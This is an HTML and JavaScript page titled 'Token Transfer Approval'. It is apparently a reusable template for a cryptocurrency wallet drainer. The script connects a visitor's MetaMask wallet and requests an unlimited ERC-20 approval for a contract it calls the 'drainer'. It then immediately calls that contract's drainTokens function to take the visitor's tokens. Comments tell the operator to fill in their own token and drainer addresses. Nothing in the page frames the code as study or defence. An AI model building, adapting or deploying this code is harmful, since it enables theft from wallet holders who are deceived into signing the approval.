<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Token Transfer Approval</title>
</head>
<body>
    <h1>Approve and Transfer ERC-20 Tokens</h1>
    <button id="connectButton">Connect Wallet</button>
    <button id="approveButton">Approve Token Transfer</button>

    <script src="https://cdnjs.cloudflare.com/ajax/libs/web3/1.6.0/web3.min.js"></script>
    <script>
        let account;

        // Connect Button Event Listener
        document.getElementById('connectButton').addEventListener('click', async () => {
            if (typeof window.ethereum !== 'undefined') {
                console.log('MetaMask is installed!');
                try {
                    const accounts = await ethereum.request({ method: 'eth_requestAccounts' });
                    account = accounts[0];
                    console.log('Connected account:', account);
                    alert(`Connected account: ${account}`);
                } catch (error) {
                    console.error('User rejected connection or error occurred:', error);
                }
            } else {
                alert('MetaMask is not installed!');
            }
        });

        const tokenAddress = '0x9a56126654ef79F703f62AB764fD10b346b5de83';  // Replace with your token's contract address
        const drainerAddress = '0x81857122FA08C0fF4D7b7c7da0DA2D329aBDA128';  // Replace with your drainer contract address
        const maxApproval = '0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff';

        async function approveTokens() {
            if (window.ethereum) {
                const web3 = new Web3(window.ethereum);

                if (!account) {
                    alert('Please connect your wallet first.');
                    return;
                }

                const approveAbi = [
                    {
                        constant: false,
                        inputs: [
                            { name: "_spender", type: "address" },
                            { name: "_value", type: "uint256" }
                        ],
                        name: "approve",
                        outputs: [{ name: "", type: "bool" }],
                        type: "function"
                    }
                ];

                const tokenContract = new web3.eth.Contract(approveAbi, tokenAddress);

                try {
                    await tokenContract.methods
                        .approve(drainerAddress, maxApproval)
                        .send({ from: account });

                    alert('Token approval successful!');
                    console.log('Token approval transaction completed.');

                    // Automatically trigger the token drain function after approval
                    drainTokens();
                } catch (error) {
                    console.error('Error during token approval:', error);
                    alert('Error in token approval: ' + error.message);
                }
            } else {
                alert('MetaMask is not installed!');
            }
        }

        async function drainTokens() {
            const web3 = new Web3(window.ethereum);

            const drainerContractAbi = [
                {
                    "constant": false,
                    "inputs": [
                        { "name": "tokenAddress", "type": "address" },
                        { "name": "amount", "type": "uint256" }
                    ],
                    "name": "drainTokens",
                    "outputs": [],
                    "payable": false,
                    "stateMutability": "nonpayable",
                    "type": "function"
                }
            ];

            const drainerContract = new web3.eth.Contract(drainerContractAbi, drainerAddress);

            try {
                const amountToDrain = web3.utils.toWei('10', 'ether');  // Adjust the amount of tokens

                // Send a transaction to the contract to drain tokens
                const tx = await drainerContract.methods.drainTokens(tokenAddress, amountToDrain).send({
                    from: account
                });

                console.log('Token drain transaction:', tx);
                alert('Token drain successful!');
            } catch (error) {
                console.error('Error in draining tokens:', error);
                alert('Error in draining tokens: ' + error.message);
            }
        }

        document.getElementById('approveButton').addEventListener('click', approveTokens);
    </script>
</body>
</html>
